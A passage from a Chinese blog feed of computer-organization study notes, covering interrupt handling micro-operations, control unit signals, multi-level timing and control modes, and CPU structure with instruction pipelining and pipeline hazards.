style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mclose">)</span></span></span></span></p><p>把MDR的数据送入对应的栈空间</p></li></ol></li></ul><h5 id="形成入口中断地址"><a class="markdownIt-Anchor" href="#形成入口中断地址"></a> 形成入口中断地址</h5><p>形成入口地址我们也介绍了两种方式：硬件向量法与软件查询法</p><p>硬件向量法：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>向量地址</mtext><mo>→</mo><mi>P</mi><mi>C</mi></mrow><annotation encoding="application/x-tex">向量地址\rightarrow PC</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord cjk_fallback">向</span><span class="mord cjk_fallback">量</span><span class="mord cjk_fallback">地</span><span class="mord cjk_fallback">址</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span></span></span></span>，即直接把形成的向量地址送入PC即可</p><p>软件查询法：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>中断程序识别入口地址</mtext><mi>M</mi><mo>→</mo><mi>P</mi><mi>C</mi></mrow><annotation encoding="application/x-tex">中断程序识别入口地址M\rightarrow PC</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord cjk_fallback">中</span><span class="mord cjk_fallback">断</span><span class="mord cjk_fallback">程</span><span class="mord cjk_fallback">序</span><span class="mord cjk_fallback">识</span><span class="mord cjk_fallback">别</span><span class="mord cjk_fallback">入</span><span class="mord cjk_fallback">口</span><span class="mord cjk_fallback">地</span><span class="mord cjk_fallback">址</span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span></span></span></span>，此时PC跳转至软件查询法提供的中断识别程序M执行，程序M会再把入口的地址送入PC。注意这里并没有直接把中断的真正入口地址直接送给PC，而是分成了两步</p><h5 id="关中断"><a class="markdownIt-Anchor" href="#关中断"></a> 关中断</h5><p>关中断即把EINT置0即可。</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn><mo>→</mo><mi>E</mi><mi>I</mi><mi>N</mi><mi>T</mi></mrow><annotation encoding="application/x-tex">0\rightarrow EINT</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">0</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span></span></span></span></p><h4 id="微指令小结"><a class="markdownIt-Anchor" href="#微指令小结"></a> 微指令小结</h4><p>通过以上对各个指令周期中CU输出的微指令分析，我们可以总结出CU的一些规律：</p><ul><li>如果指令不访存，则不涉及总线传输、MDR和MAR。CU仅在CPU内输出简单的单步或双步信号。</li><li>如果指令访存，如取指、存数、断点保存等过程，一般要涉及到总线和主存寄存器的使用。首先要将需要取数/写数的地址送入MAR，再由控制寄存器设置相应的读写信号，接着就可以把要写的数据送入MDR或者把访存的数据存入MDR，最后再把MDR内的数据写入主存或者送入CPU的ACC内。</li><li>如果指令涉及转移，则一般还要用上PC寄存器。注意是有条件转移还是无条件转移。</li></ul><h3 id="控制单元的功能"><a class="markdownIt-Anchor" href="#控制单元的功能"></a> 控制单元的功能</h3><p>以上微指令的分析流程想必大家都已经有了个大概的轮廓，但我们都只是基于符号表示给出了形式上的说明，本节我们就来学习在硬件上CU是如何驱动完成这些功能的。</p><p>我们先给出CU的一幅结构图。</p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240621164920497.png" alt="image-20240621164920497" style="zoom:50%;" /><p>我们根据这幅图来介绍与CU有关的输入信号和输出信号。</p><h4 id="输入信号"><a class="markdownIt-Anchor" href="#输入信号"></a> 输入信号</h4><p>由图可知，CU接受以下四个输入信号：</p><ul><li><p>时钟</p><p>CU受时钟控制，一个时钟脉冲下，CU可以发送一个或者一组需要同时执行的操作命令。是驱动计算机运行的最基础信号，也是我们后续介绍多级时序系统的基础。</p></li><li><p>指令寄存器</p><p>即<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mi>P</mi><mo stretchy="false">(</mo><mi>I</mi><mi>R</mi><mo stretchy="false">)</mo><mo>→</mo><mi>C</mi><mi>U</mi></mrow><annotation encoding="application/x-tex">OP(IR)\rightarrow CU</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord mathnormal" style="margin-right:0.10903em;">U</span></span></span></span>时，存储指令中操作码的信息。控制信号的发出依赖于操作码。</p></li><li><p>标志</p><p>CU还受标志控制，比如条件转移标志位</p></li><li><p>外来信号</p><p>比如INTR中断请求、HRQ总线请求等</p></li></ul><h4 id="输出信号"><a class="markdownIt-Anchor" href="#输出信号"></a> 输出信号</h4><p>由图可知，CU输出的信号可分为两类：CPU内的各种控制信号和送至控制总线的信号。</p><ul><li><p>CPU内的控制信号</p><p>如：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>R</mi><mi>i</mi></msub><mo>→</mo><msub><mi>R</mi><mi>j</mi></msub></mrow><annotation encoding="application/x-tex">R_i\rightarrow R_j</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.00773em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.969438em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:-0.00773em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span></span></span></span>寄存器之间的赋值操作</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mi>P</mi><mi>C</mi><mo stretchy="false">)</mo><mo>+</mo><mn>1</mn><mo>→</mo><mi>P</mi><mi>C</mi></mrow><annotation encoding="application/x-tex">(PC)+1\rightarrow PC</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span></span></span></span>指令计数器递增</p><p>ALU中的+、-、与、或等各种算数控制信号</p></li><li><p>送至控制总线的信号</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mover accent="true"><mrow><mi>M</mi><mi>E</mi><mi>R</mi><mi>Q</mi></mrow><mo stretchy="true">‾</mo></mover></mrow><annotation encoding="application/x-tex">\overline{MERQ}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0777700000000001em;vertical-align:-0.19444em;"></span><span class="mord overline"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8833300000000001em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mord mathnormal">Q</span></span></span><span style="top:-3.80333em;"><span class="pstrut" style="height:3em;"></span><span class="overline-line" style="border-bottom-width:0.04em;"></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.19444em;"><span></span></span></span></span></span></span></span></span> 访存控制信号</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mover accent="true"><mrow><mi>I</mi><mi>O</mi></mrow><mo stretchy="true">‾</mo></mover><mi mathvariant="normal">/</mi><mi>M</mi></mrow><annotation encoding="application/x-tex">\overline{IO}/M</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.13333em;vertical-align:-0.25em;"></span><span class="mord overline"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8833300000000001em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span></span></span><span style="top:-3.80333em;"><span class="pstrut" style="height:3em;"></span><span class="overline-line" style="border-bottom-width:0.04em;"></span></span></span></span></span></span><span class="mord">/</span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span></span></span></span>访问IO/存储器的控制信号</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mover accent="true"><mrow><mi>R</mi><mi>D</mi></mrow><mo stretchy="true">‾</mo></mover><mtext>、</mtext><mover accent="true"><mrow><mi>W</mi><mi>R</mi></mrow><mo stretchy="true">‾</mo></mover></mrow><annotation encoding="application/x-tex">\overline{RD}、\overline{WR}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8833300000000001em;vertical-align:0em;"></span><span class="mord overline"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8833300000000001em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span></span></span><span style="top:-3.80333em;"><span class="pstrut" style="height:3em;"></span><span class="overline-line" style="border-bottom-width:0.04em;"></span></span></span></span></span></span><span class="mord cjk_fallback">、</span><span class="mord overline"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8833300000000001em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span></span></span><span style="top:-3.80333em;"><span class="pstrut" style="height:3em;"></span><span class="overline-line" style="border-bottom-width:0.04em;"></span></span></span></span></span></span></span></span></span>读命令与写命令</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>I</mi><mi>N</mi><mi>T</mi><mi>A</mi></mrow><annotation encoding="application/x-tex">INTA</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mord mathnormal">A</span></span></span></span>中断响应信号</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>H</mi><mi>L</mi><mi>D</mi><mi>A</mi></mrow><annotation encoding="application/x-tex">HLDA</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mord mathnormal">L</span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="mord mathnormal">A</span></span></span></span>总线响应信号</p></li></ul><h4 id="举例"><a class="markdownIt-Anchor" href="#举例"></a> 举例</h4><p>这里主要谈谈CPU中分散连接和采用CPU内总线通信的两种结构，简单的过一下。只要掌握了CU微指令流程其实就很简单。</p><p>下图是分散连接的一个示例：</p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240621171409141.png" alt="image-20240621171409141" style="zoom:50%;" /><p>可以看到这么做需要比较繁多的线路，如果我们引入CPU内部总线，就可以大大简化电路。</p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240621171506973.png" alt="image-20240621171506973" style="zoom:50%;" /><p>可以看到，引入内部总线后，CPU内各部件的通信只需要依赖于一根总线，而无须庞杂繁琐的各部件都连线。其中还有一点变化需要注意：ALU多了寄存器Y和Z，Y用来存放另一操作数，Z用来临时放计算结果，防止结果放入总线后又被ALU读入。</p><h3 id="多级时序系统"><a class="markdownIt-Anchor" href="#多级时序系统"></a> 多级时序系统</h3><p>终于来到了本章的重头戏——多级时序系统。别被这个高大上的名称吓到了，其实内容很简单，就是一个概念的套娃。指令周期&gt;机器周期&gt;时钟周期。</p><p>我们来学习一下机器周期和时钟周期的概念，就可以理解多级时序系统了。</p><h4 id="机器周期"><a class="markdownIt-Anchor" href="#机器周期"></a> 机器周期</h4><p>机器周期，即<strong>所有指令执行过程的一个基准时间</strong>。通常指的是完成一个特定功能所需的一系列时钟周期。例如，从内存中读取数据或写入数据可能需要多个时钟周期来完成。机器周期通常包括数据传输、地址访问、控制信号的建立等。</p><p>通常我们确定机器周期时，需要考虑<strong>每条指令的执行步骤</strong>和<strong>每一步骤所需的时间</strong>。一般来说，我们把完成最复杂指令功能的时间作为机器周期的基准时间。最复杂指令通常是访存操作，所以我们一般是以访问一次存储器的时间为基准。</p><p>如果指令字长＝存储字长，那么取指周期=机器周期。</p><p>每个机器周期内部也有很多微操作，有先后顺序。所以机器周期内部也需要有多个时钟周期，由时钟控制微操作先后顺序。</p><h4 id="时钟周期"><a class="markdownIt-Anchor" href="#时钟周期"></a> 时钟周期</h4><p>时钟周期，又称节拍或者状态，是计算机中最基本的时间单位，可以用时钟周期控制产生一个或几个微操作的命令。</p><p>如果微操作可并行，则一个机器周期内可完成若干个微操作。</p><p>时钟周期与机器周期的关系如下图：</p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240621173315652.png" alt="image-20240621173315652" style="zoom:50%;" /><p>可以看到，时钟周期的每一个上升沿会给T<sub>0</sub>一个信号，微操作的下降沿又会激活下一个微操作。一组由时钟周期调控的微操作组成一个机器周期。</p><h4 id="多级时序系统-2"><a class="markdownIt-Anchor" href="#多级时序系统-2"></a> 多级时序系统</h4><p>机器周期、节拍（状态、时钟周期）组成多级时序系统，一个指令周期包含若干个机器周期，一个机器周期包含若干个时钟周期。</p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240621174044179.png" alt="image-20240621174044179" style="zoom:50%;" /><h3 id="控制方式"><a class="markdownIt-Anchor" href="#控制方式"></a> 控制方式</h3><p>产生一个微指令操作后，下一个指令什么时候产生呢？我们有几种控制方式：同步控制方式、异步控制方式、联合控制方式和人工控制方式。</p><p>我们主要介绍同步控制方式，这也是大多数计算机目前所在采用的控制方式。</p><h4 id="同步控制方式"><a class="markdownIt-Anchor" href="#同步控制方式"></a> 同步控制方式</h4><p>同步控制方式，即任一微操作均由<strong>统一基准时标</strong>的时序信号控制。它的特征是，一定有一个定宽定距的时钟。</p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240621180344264.png" alt="image-20240621180344264" style="zoom:50%;" /><p>同步控制方式有三种类别：</p><ul><li><p>采用定长的机器周期</p><p>这种方式强制规定了机器周期内的节拍数相同，此时的机器周期以最长的微操作序列和最繁的微操作作为标准。这就导致了在一些相对简单的机器周期内，会产生空闲的节拍，即浪费了部分时钟周期。</p></li><li><p>采用不定长的机器周期</p><p>即机器周期内的节拍数不等，执行指令过程较短的话可以含较少的节拍，如果执行指令过程较长则可以延长节拍。</p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240621180828791.png" alt="image-20240621180828791" style="zoom:50%;" /></li><li><p>中央控制和局部控制相结合</p><p>还可以采用采用中央控制和局部控制相结合的方法，即执行较长的延长的周期由局部节拍进行控制。</p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240621181011617.png" style="zoom:50%;" /></li></ul><h4 id="异步控制方式"><a class="markdownIt-Anchor" href="#异步控制方式"></a> 异步控制方式</h4><p>异步控制方式即一个微操作完成后，会给出一个应答信号。它没有基准时标信号和固定的周期节拍与严格的时钟同步，采用应答方式来控制。</p><h4 id="联合控制方式"><a class="markdownIt-Anchor" href="#联合控制方式"></a> 联合控制方式</h4><p>即同步和异步相结合的操作，常用与复杂的指令控制，如IO指令等。</p><h4 id="人工控制方式"><a class="markdownIt-Anchor" href="#人工控制方式"></a> 人工控制方式</h4><p>即人为参与程序运行调控，多用于程序调试，有以下三种方式：</p><ul><li>Reset，即重置程序。</li><li>(2) 连续和单条指令执行转换开关，如8086汇编中的单步断点调试。</li><li>符合停机开关，用于计算机的故障处理和容错率展示。</li></ul><p>……</p><p>……</p><p>第六部分到此结束！敬请阅读第七部分🌹</p><hr /><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/612FFB2DEDE35B9C77545DB9ADF1C8BF.jpg" alt="612FFB2DEDE35B9C77545DB9ADF1C8BF" /></p>]]></content>
      
      
      <categories>
          
          <category> 计算机组成指北 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计算机组成原理 </tag>
            
            <tag> 控制单元 </tag>
            
            <tag> 多级时序系统 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机组成指北（五）</title>
      <link href="/posts/159e2ded72f9/"/>
      <url>/posts/159e2ded72f9/</url>
      
        <content type="html"><![CDATA[<h2 id="第八章-cpu的结构和功能"><a class="markdownIt-Anchor" href="#第八章-cpu的结构和功能"></a> 第八章 CPU的结构和功能</h2><blockquote><p>重难点注意！</p><p>周期流水和中断<br />指令流水非常非常重要<strong>绝对会考</strong>，怎么构成指令流水，几个周期构成流水，以及产生影响的主要因素，如何解决。要会计算流水效率。<br />中断请求标记 电路图不需要记住<br />中断隐指令概念要记住<br />屏蔽字<strong>一定会考</strong>，且占比高</p></blockquote><p>我们已经学习完了CPU的指令系统，但是指令是如何被CPU调用的呢？这就涉及到中断系统和CU部分了。本章从分析CPU的功能和内部结构入手，详细讨论计机器执行一条指令的全过程，以及为了提高数据处理能力、开发系统的并行性所采取的指令流水技术。</p><h3 id="cpu的结构"><a class="markdownIt-Anchor" href="#cpu的结构"></a> CPU的结构</h3><p>在第一章我们知道CPU主要由运算器和控制器组成。运算器已经在第六章学习完毕，这里主要讨论CPU的控制器的功能。</p><p>运算器的功能：</p><ul><li>实现算术运算和逻辑运算（数据加工）</li></ul><p>控制器的功能：</p><ul><li>取指令（指令控制）</li><li>分析指令（指令控制）</li><li>执行指令，发出各种操作命令（指令控制）</li><li>控制程序输入及结果的输出（操作控制）</li><li>总线管理（时间控制）</li><li>处理异常情况和特殊请求（处理中断）</li></ul><p>CPU必须具有指令控制、操作控制、时间控制、处理终端和数据加工的能力。</p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240619175634266.png" alt="image-20240619175634266" style="zoom:50%;" /><p>其中指令控制与PC、IR有关；操作控制和时间控制则涉及到CU和时序电路；数据加工与ALU和寄存器有关；处理终端则和中断系统有关。</p><h4 id="寄存器"><a class="markdownIt-Anchor" href="#寄存器"></a> 寄存器</h4><p>CPU的寄存器分为用户可见寄存器和用户不可见寄存器。用户不可见寄存器很多，例如流水段之间的流水段寄存器。</p><p>用户可见的寄存器有：</p><ul><li>通用寄存器，存放操作数</li><li>数据寄存器，存放操作数</li><li>地址寄存器，存放地址</li><li>条件码寄存器，存放条件码</li></ul><p>不可见的寄存器有：</p><ul><li><p>控制寄存器</p><p>以取指令为例子：PC➡️MAR➡️M➡️MDR➡️IR</p><p>其中MAR、MDR、IR对用户不可见，而PC可见</p></li><li><p>状态寄存器</p><p>反映指令执行结果的情况或者计算机软件硬件的状态。比如状态寄存器，PSW寄存器（比如8086的flag寄存器）。</p></li></ul><h4 id="控制单元cu和中断系统"><a class="markdownIt-Anchor" href="#控制单元cu和中断系统"></a> 控制单元CU和中断系统</h4><p>其中，CU负责产生全部指令的微操作命令序列，包括：</p><ul><li>组合逻辑设计，即硬连线逻辑</li><li>微程序设计，即存储逻辑</li></ul><p>以上内容将在第十章介绍。</p><p>中断系统，将在本章节后续小节具体介绍。</p><h4 id="alu"><a class="markdownIt-Anchor" href="#alu"></a> ALU</h4><p>参见第六章</p><h3 id="指令周期"><a class="markdownIt-Anchor" href="#指令周期"></a> 指令周期</h3><p>指令周期，指的就是CPU取出并执行一条指令所需要的全部时间。</p><p>一般来说，完成一条指令，可以分为两个阶段：</p><ul><li>取指、分析；称取指周期</li><li>执行；称执行周期</li></ul><p>不过，具体来说，每条指令的指令周期一般不同，比如Nop就只有取指周期。指令周期一共可以细分为四个周期：取值周期、间址周期、执行周期、中断周期。</p><p>具体的流程可以参考下图：</p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240619193003466.png" alt="image-20240619193003466" style="zoom:50%;" /><p>控制器在指令执行的不同阶段要发出不同命令。尽管都是内存读写操作，不同周期功能不同，读写位置不同：</p><ul><li>取指周期，取出指令，送入IR；</li><li>间址周期，取出地址，送入IR或MDR的地址码部分；</li><li>执行周期，读出来的数据放入CPU寄存器中；</li><li>中断周期，程序断点存入内存。</li></ul><p>CPU必须标注出当前处于指令的哪个阶段，以便于控制器发出相应的控制操作，这些标志就是<strong>CPU 工作周期的标志</strong>。为了区分它们，在CPU内可以设置四个标志触发器：</p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240619193332739.png" style="zoom:50%;" /><p>FE、IND、EX、INT分别对应取指、间址、执行和中断四个周期，并以“1”状态表示有效。</p><h3 id="指令流水"><a class="markdownIt-Anchor" href="#指令流水"></a> 指令流水</h3><p>指令流水是一项极其重要的技术，需要重点掌握。无论是嵌入式，还是服务器，都使用流水技术。</p><p>我们先前提到过，要提高机器速度，可以从几个方面入手：</p><ol><li>提高访问速度：比如使用高速芯片、Cache、多提并行</li><li>提高I/O和主机之间的传送速度：比如使用中断、DMA、通道、I/O处理机等技术</li><li>提高运算器的速度：比如使用高速芯片，改进算法，使用快速进位链等</li></ol><p>现在，我们介绍第四种方法——提高整机的处理能力，即改进系统结构，开发系统的<strong>并行性</strong>。</p><p>所谓并行，包含并发性和同时性两个概念：</p><ul><li>并发，指两个或两个以上事件在<strong>同一时间段</strong>发生</li><li>同时，指两个或两个以上事件在<strong>同一时刻</strong>发生</li></ul><p>概括来说，只要<strong>时间上存在相互重叠</strong>，就具有并行性。</p><p>并行性的等级又分为作业级或程序级、任务级或进程级、指令之间级和指令内部级。前两者称为<strong>粗粒度</strong>，用软件实现；后两者称为<strong>细粒度</strong>，用硬件实现。</p><h4 id="原理"><a class="markdownIt-Anchor" href="#原理"></a> 原理</h4><p>我们先来看指令的串行执行：</p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240619195144814.png" style="zoom:50%;" /><p>可以看到，取指令时，只有取指令的部件在工作；执行指令时，只有执行指令的部件在工作。总会有一个部件空闲，没有充分的发挥出计算机的效率。</p><p>接着我们使用指令的二级流水：</p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240619195335432.png" alt="image-20240619195335432" style="zoom:50%;" /><p>可以看到，如果取指和执行阶段的时间完全重叠，则指令周期减半，速度提高了一倍。但实际情况下，流水线很难满负荷运转，因为指令不会仅分成两个阶段，指令之间也有相关性，不同阶段的耗时也不同。</p><p>影响指令流水的因素如下：</p><ul><li>执行时间＞取指时间</li><li>条件转移指令对指令流水的影响：必须等上一条指令执行结束才能确定下一条指令的地址，这造成了很大的时间损失。</li></ul><p>尽管这些因素影响了流水线的效率，但还是可以获得加速。</p><p>为了进一步提高处理速度，我们把处理过程分为更细的几个阶段：</p><ul><li>FI：取指令</li><li>DI：指令译码</li><li>CO：形成操作数的地址</li><li>FO：取操作数</li><li>EI：执行</li><li>WO：结果写回</li></ul><p>于是，我们就能根据这里六个阶段，设计一个六级流水：</p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240619200109839.png" alt="image-20240619200109839" style="zoom:50%;" /><p>完成一条指令需要6个时间单位：</p><ul><li>如果串行执行，则需要6×9=54个时间单位</li><li>如果六级流水，则需要14个时间单位</li></ul><p>可以看出流水线大大地提高了计算机的运行效率。</p><h4 id="影响流水的因素"><a class="markdownIt-Anchor" href="#影响流水的因素"></a> 影响流水的因素</h4><p>要保持高效率，我们就必须要保持流水充分流动，不发生断流。但由于在流水线中会出现<strong>三个相关</strong>，所以很难实现不断流动。三个相关即：</p><ul><li>结构相关，不同指令争用同一硬件部件</li><li>数据相关，后继指令需要用到前面指令的执行结果</li><li>控制相关，遇到分支指令和其他改变PC值引起的相关</li></ul><h5 id="结构相关"><a class="markdownIt-Anchor" href="#结构相关"></a> 结构相关</h5><p>要解决结构相关的问题，我们通常采用以下方法：</p><ul><li>停顿，让一个指令先执行</li><li>指令存储器与数据存储器分开，避免取指令和取操作数产生冲突</li><li>指令预取技术，适用于访存周期短的情况，利用空闲时间取出多条指令放入指令缓冲寄存器</li></ul><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240619200736020.png" alt="image-20240619200736020" /></p><p>另外，除了存储器资源，其他资源也都会冲突，例如寄存器。</p><h5 id="数据相关"><a class="markdownIt-Anchor" href="#数据相关"></a> 数据相关</h5><p>数据相关指不同指令因重叠操作，可能改变操作数的 读/写 访问顺序。</p><p>数据相关又分为三种：写后读相关，读后写相关和写后写相关</p><ul><li><p>写后读相关·RAW</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240619201634128.png" alt="image-20240619201634128" /></p></li><li><p>读后写相关·WAR</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240619201641779.png" alt="image-20240619201641779" /></p></li><li><p>写后写相关·WAW</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240619201647894.png" alt="image-20240619201647894" /></p></li></ul><p>解决方法有二：后推法和旁路技术。</p><ul><li>后推法：等待第一条指令将结果写入寄存器后，第二条指令才开始读执行。这样做显然需要停顿流水线。</li><li>旁路技术：相关专用通路、前向通道：不需要等到结果送回寄存器，运算器结果产生后，直接作为输入，开始第二条指令执行。</li></ul><p>在按序流动的流水线中，只可能出现RAW相关；而在非按序流动的流水线中，则三种都可能出现。</p><h5 id="控制相关"><a class="markdownIt-Anchor" href="#控制相关"></a> 控制相关</h5><p>由转移指令引起，不得不停止等待判断的结果才知道接下来该执行哪里。</p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240619202134351.png" 